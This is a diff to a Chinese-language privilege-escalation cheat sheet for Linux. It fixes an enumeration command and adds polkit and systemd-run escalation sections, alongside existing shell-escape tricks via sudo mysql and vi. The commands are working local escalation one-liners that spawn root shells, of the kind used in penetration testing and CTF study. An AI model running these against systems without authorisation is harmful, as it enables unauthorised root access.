@@ -47,7 +47,7 @@ arp -a      # 查看ARP缓存
 hostname    # 查看机器名称
 # 权限枚举
 sudo -l     # 查看当前用户sudo权限
-getcap -l / 2>/dev/null # 查找具有特殊能力的可执行文件
+/sbin/getcap -r / 2>/dev/null # 查找具有特殊能力的可执行文件
 
 cat /etc/crontab    # 查看自动任务
 echo $PATH          # $PATH告诉shell去哪找命令对应的程序，从左向右一次寻找
@@ -122,8 +122,6 @@ less -r result.txt
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-### 提权方法
-
 ### git 提权
 
 ```shell
@@ -179,6 +177,22 @@ sudo mysql -e "\! /bin/bash"
 ### vi/vim提权
 
 当vi/vim被以root权限执行时, 输入命令`:!sh`即可开启一个终端会话
+
+### polkit提权
+
+若`polkit-agent-helper-1`存在SUID位, 可以执行一个需要授权的程序(比如`systemd-run`), 这样就可以利用`polkit-agent-helper-1`的上下文实现提权
+
+### systemd-run提权
+
+```shell
+systemd-run -S
+```
+
+或者
+
+```shell
+systemd-run -t /bin/bash
+```
 
 ## 服务漏洞提权
 
